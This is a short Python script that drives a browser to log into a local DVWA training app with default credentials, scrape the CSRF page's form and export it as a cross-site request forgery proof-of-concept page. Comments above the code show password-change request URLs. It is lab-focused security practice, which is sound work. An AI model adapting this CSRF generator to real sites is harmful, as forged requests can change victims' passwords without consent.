#post {"email":"tst@tst.com","password":"12345"} login
#GET /rest/user/change-password?current=12345&new=123456&repeat=123456 change

import os
import rpa as r
from bs4 import BeautifulSoup
creds = ["admin", "password"]
creds[len(creds)-1] += "[enter]" # have RPA press enter after typing credentials
loginPage = 'http://localhost/DVWA/login.php'

def login(loginPage, creds):
	r.url(loginPage)
	r.type('//*[@name="username"]', creds[0])
	r.type('//*[@name="password"]', creds[1])

def create_poc():
	# if r.click('CSRF'):
	if r.url('http://localhost/DVWA/vulnerabilities/csrf/'):
		html = r.dom('return document.querySelector("html").outerHTML')
		soup = BeautifulSoup(html, 'html.parser')
		form = soup.find("form")
		form['action'] = r.url()+form['action']

	elif r.click('bruh'):
		pass

	f = open("poc.html", "w")
	f.write(str(form))
	pwd = os.path.dirname(os.path.realpath(__file__))
	output = pwd + "/poc.html"
	print("Exported PoC to " + output)

	r.clipboard("file://"+output)
	r.keyboard("[ctrl][t]")
	r.keyboard("[ctrl][v]")
	r.keyboard("[enter]")
	r.wait(1)
	r.keyboard("[ctrl][r]")
	r.wait(1)
	r.keyboard("[ctrl][r]")
	r.wait(1)
	r.keyboard("[ctrl][r]")
	f.close()


	#fields = form.findAll('input')

	# formdata = dict( (field.get('name'), field.get('value')) for field in fields)

	# formdata['username'] = u'username'
	# formdata['password'] = u'password'

	# print(formdata)

# login = requests.Session()
# print(login.post(loginPage, creds))


r.init(visual_automation = True)
login(loginPage, creds)
create_poc()



# Cleanup
# r.wait(3)
# r.close()
